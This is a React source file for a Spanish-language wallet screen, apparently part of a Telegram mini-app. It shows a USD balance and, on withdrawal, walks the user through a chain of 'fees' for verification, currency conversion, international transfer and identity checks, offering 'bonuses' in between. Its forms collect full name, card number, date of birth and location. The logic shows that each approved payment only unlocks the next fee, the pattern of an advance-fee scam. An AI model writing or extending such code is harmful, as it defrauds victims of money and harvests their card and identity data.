/* eslint-disable react-hooks/exhaustive-deps */
/* eslint-disable react/no-unescaped-entities */
import { TailSpin } from "react-loader-spinner";
import { useDispatch, useSelector } from "react-redux";
import { Link, useNavigate } from "react-router-dom";
import Modal from "../../UI/Modal";
import { FaSmileBeam } from "react-icons/fa";

import { useEffect, useState } from "react";
import {
  checkPaymanetStatus,
  getBonusForCom,
  getCurrency,
  getUserInfo,
  TG_ID,
} from "../../../util/back/requests";
import ConfettiExplosion from "react-confetti-explosion";
import { IoSadOutline } from "react-icons/io5";
import { setUser } from "../../../store/auth-slice";

const WalletCard = () => {
  const balance = useSelector((state) => state.auth.balance);
  const statusOrder = localStorage.getItem("statusOrder");
  const priceAmount = localStorage.getItem("priceAmount");

  const [list, setList] = useState();
  const [status, setStatus] = useState(statusOrder);
  const navigate = useNavigate();
  const [confetti, setConfetti] = useState();
  const dispatch = useDispatch();
  const storageCurrency = localStorage.getItem("country")
    ? localStorage.getItem("country")
    : "ARS";
  const activeCurrency = list?.find((el) => el.country == storageCurrency);
  useEffect(() => {
    const fetchData = async () => {
      const response = await getCurrency();
      setList(response);
    };
    fetchData();
  }, []);

  const getBonus = async () => {
    setStatus("VERIFY");
    localStorage.setItem("statusOrder", "VERIFY");

    // if (statusOrder == "SUCCESSFUL") {
    //   return;
    // }
    if (priceAmount == 9 || priceAmount == 7) {
      const newData = await getBonusForCom(priceAmount == 7 ? 30 : 9);
      if (newData) {
        const response = await getUserInfo(TG_ID);
        dispatch(setUser(response));
      }
    }

    setConfetti(true);
  };

  useEffect(() => {
    let isMounted = true;
    const checkStatus = async () => {
      const response = await checkPaymanetStatus();

      if (response == "APPROVED") {
        if (priceAmount == 14) {
          localStorage.setItem("statusOrder", "NATIONAL");
          setStatus("NATIONAL");
        } else if (priceAmount == 17) {
          localStorage.setItem("statusOrder", "VERIFY");
          setStatus("VERIFY");
        } else {
          localStorage.setItem("statusOrder", "SUCCESSFUL");
          setStatus("SUCCESSFUL");
        }
      } else if (response == "DECLINED") {
        localStorage.removeItem("statusOrder");
        setStatus("DECLINE");
      }
    };

    // const interval = setInterval(() => {
    //   if (status === "WAITING") {
    //     checkStatus();
    //   }
    // }, 1000);
    if (isMounted && status === "WAITING" && statusOrder === "WAITING") {
      setTimeout(checkStatus, 1000);
    }
    if (status === "WAITING" && statusOrder === "WAITING") {
      checkStatus();
    }

    return () => {
      isMounted = false; // Очищення при розмонтуванні компонента.
    };
  }, [status, priceAmount]);

  return (
    <>
      {confetti && <ConfettiExplosion />}
      <Modal
        isOpen={
          status == "WAITING" ||
          status == "SUCCESSFUL" ||
          status == "VERIFIED" ||
          status == "NATIONAL" ||
          status == "IDENF" ||
          status == "DECLINE"
        }
      >
        {status == "DECLINE" && (
          <div className="flex-1 text-[20px] flex flex-col items-center gap-2  text-[#E7FF2B]">
            <div className="flex-1 text-[20px] flex items-center gap-2  text-[#E7FF2B]">
              Estado: rechazado{" "}
              <div className="text-[150%]">
                <IoSadOutline />
              </div>
            </div>
            <div className="text-[14px]">
              Su pago no se ha efectuado, tal vez haya cometido un error o hay
              un retraso en el pago. Escriba al servicio de asistencia técnica y
              aclare el motivo
            </div>
            <div className="w-full mt-4">
              <button
                className=" bg-[#E7FF2B] rounded-md w-full text-[#37C100] py-1"
                onClick={() => setStatus("")}
              >
                Ok
              </button>
            </div>
          </div>
        )}
        {status == "WAITING" && (
          <div className="flex-1 text-[20px] flex flex-col items-center gap-2  text-[#E7FF2B]">
            <p> Estado: a la espera de</p>
            <div className="flex item-center gap-2">
              <p> confirmación de pago</p>
              <div>
                <TailSpin
                  visible={true}
                  height="20"
                  width="20"
                  color="yellow"
                />
              </div>
            </div>
            <div className="w-full mt-4">
              <button
                className=" bg-[#E7FF2B] rounded-md w-full text-[#37C100] py-1"
                onClick={() => setStatus(false)}
              >
                Ok
              </button>
            </div>
          </div>
        )}
        {status == "SUCCESSFUL" && (
          <>
            <div className="flex-1 text-[20px] flex items-center gap-2  text-[#E7FF2B]">
              Estado: correcto{" "}
              <div className="text-[150%]">
                <FaSmileBeam />
              </div>
            </div>
            <div className="text-[16px] mt-4">
              Le pedimos disculpas por las molestias ocasionadas, nosotros por
              nuestra parte le ofrecemos a usted una bonificación de ${" "}
              {priceAmount == 7 ? 30 : priceAmount == 9 ? 9 : 7} haga clic en el
              botón
            </div>
            <div className="w-full mt-4">
              <button
                className=" bg-[#E7FF2B] rounded-md w-full text-[#37C100] py-1"
                onClick={getBonus}
              >
                Consigue una bonificación
              </button>
            </div>
          </>
        )}
        {status == "VERIFIED" && (
          <form
            className="text-[18px] text-justify flex flex-col gap-4 w-full"
            onSubmit={() => {
              navigate(
                `/menu/wallet/withdraw-second?currency=${activeCurrency.value}&country=${activeCurrency.country}&type=second`,
              );
            }}
          >
            <h1 className="text-center text-[24px]">Introduzca sus datos</h1>
            {status == "VERIFIED" && priceAmount == 14 && (
              <div className="text-[13px]">
                Como tus ganancias son en dólares, tendrás que pagar una
                comisión la conversión a la moneda de tu país y obtendrás tus
                ganancias en 2-3 minutos. en 2-3 minutos y también tiene un
                botón «pagar por la conversión».
              </div>
            )}
            <div className="rounded-[28px] w-full bg-[#FFFFFF66] p-3">
              <input
                className="w-full"
                placeholder="Introduzca su nombre completo"
                required
              />
            </div>
            <div className="rounded-[28px] w-full bg-[#FFFFFF66] p-3">
              <input
                className="w-full"
                placeholder="Introduzca el nombre de su banco (opcional)"
              />
            </div>
            <div className="rounded-[28px] w-full bg-[#FFFFFF66] p-3">
              <input
                className="w-full"
                placeholder="Introduzca su número de tarjeta"
                required
              />
            </div>

            <div className="flex gap-2 w-full items-center  mt-4">
              <button
                className=" bg-[#E7FF2B] rounded-md w-full text-[#37C100] py-1"
                type="submit"
              >
                PAGAR
                {activeCurrency?.value * priceAmount} {activeCurrency?.country}
              </button>
              {/* <button className="w-full rounded-md outline outline-2 outline-[#E7FF2B] py-1">
                Cancel
              </button> */}
            </div>
          </form>
        )}
        {status == "NATIONAL" && (
          <div className="text-[15px]">
            Estimado usuario, debido a que el banco que le enviará su dinero
            está en otro país tendrá que depositar
            {activeCurrency?.value * 17} {activeCurrency?.country}, esta es la
            cantidad que se le añadirá a sus ganancias inmediatamente después
            del pago.
            <button
              className=" bg-[#E7FF2B] rounded-md w-full text-[#37C100] py-1 mt-8"
              type="submit"
              onClick={() => {
                localStorage.setItem("priceAmount", 17);
                navigate(
                  `/menu/wallet/withdraw-second?currency=${activeCurrency.value}&country=${activeCurrency.country}&type=third`,
                );
              }}
            >
              PAGAR TRANSFERENCIA INTERNACIONAL
            </button>
          </div>
        )}
        {status == "IDENF" && (
          <form
            className="text-[18px] text-justify flex flex-col gap-4 w-full"
            onSubmit={() => {
              localStorage.setItem("priceAmount", 19);

              navigate(
                `/menu/wallet/withdraw-second?currency=${activeCurrency.value}&country=${activeCurrency.country}&type=fourth`,
              );
            }}
          >
            <h1 className="text-center text-[24px]">Introduzca sus datos</h1>
            <div className="rounded-[28px] w-full bg-[#FFFFFF66] p-3">
              <input
                className="w-full"
                placeholder="Enter your full name"
                required
              />
            </div>
            <div className="rounded-[28px] w-full bg-[#FFFFFF66] p-3">
              <input
                className="w-full"
                placeholder="Fecha de nacimientod"
                required
              />
            </div>
            <div className="rounded-[28px] w-full bg-[#FFFFFF66] p-3">
              <input className="w-full" placeholder="País, ciudad" required />
            </div>
            <div className="rounded-[28px] w-full bg-[#FFFFFF66] p-3">
              <input
                className="w-full"
                placeholder="Introduzca el nombre de su banco (opcional)"
              />
            </div>

            <div className="flex gap-2 w-full items-center  mt-4">
              <button
                className=" bg-[#E7FF2B] rounded-md w-full text-[#37C100] py-1"
                type="submit"
              >
                PAGAR
                {activeCurrency?.value * 19} {activeCurrency?.country}
              </button>
              {/* <button className="w-full rounded-md outline outline-2 outline-[#E7FF2B] py-1">
                Cancel
              </button> */}
            </div>
          </form>
        )}
      </Modal>
      <div
        className="w-full flex flex-col pl-[20px] py-[15px] text-[#1E1E1E] rounded-[25px] mt-[18px]"
        id="wallet-card"
      >
        <div className="w-max relative">
          <h1 className="text-[38px] w-max leading-10">
            {balance ? balance.toFixed(2) : "0.00"} USD
          </h1>
          <div className="w-full flex justify-end text-[14px]">
            {/* <div>**** 4562</div> */}

            <div>Su dinero</div>
          </div>
          <div className="mt-8 text-[11px]">Retirada a partir de 25 USD </div>
        </div>
      </div>
      <div className="w-full px-[20px]">
        <div className="w-full bg-[#E7FF2B5E] rounded-b-[25px] px-[10px] grid grid-cols-2 gap-[10px]">
          <Link
            to="/menu/wallet/history"
            className="border-[4px] border-white rounded-[28px] flex items-center justify-center py-[16px] my-[12px]"
          >
            Historia
          </Link>
          {statusOrder == "WAITING" ? (
            <div
              onClick={() => setStatus("WAITING")}
              className="rounded-[28px] flex items-center justify-center text-[#1E1E1E] bg-white py-[16px] my-[12px]"
            >
              Retirar
            </div>
          ) : (
            <Link
              to="/menu/wallet/country-select"
              className="rounded-[28px] flex items-center justify-center text-[#1E1E1E] bg-white py-[16px] my-[12px]"
            >
              Retirar
            </Link>
          )}

          {status == "VERIFY" && (
            <div className="w-full flex items-center justify-center col-span-2 px-6">
              <button
                className=" bg-[#E7FF2B] rounded-[28px] w-full text-[#37C100] py-2 mb-4"
                onClick={() => {
                  localStorage.setItem(
                    "priceAmount",
                    priceAmount == 7
                      ? 9
                      : priceAmount == 9
                        ? 14
                        : priceAmount == 14
                          ? 17
                          : 19,
                  );
                  if (priceAmount == 19) {
                    localStorage.setItem("statusOrder", "IDENF");
                    setStatus("IDENF");
                  } else {
                    localStorage.setItem("statusOrder", "VERIFIED");
                    setStatus("VERIFIED");
                  }
                }}
              >
                {priceAmount == 7
                  ? "Verify details"
                  : priceAmount == 17
                    ? "Identity verification"
                    : "Currency conversion"}
              </button>
            </div>
          )}
        </div>
      </div>
    </>
  );
};

export default WalletCard;
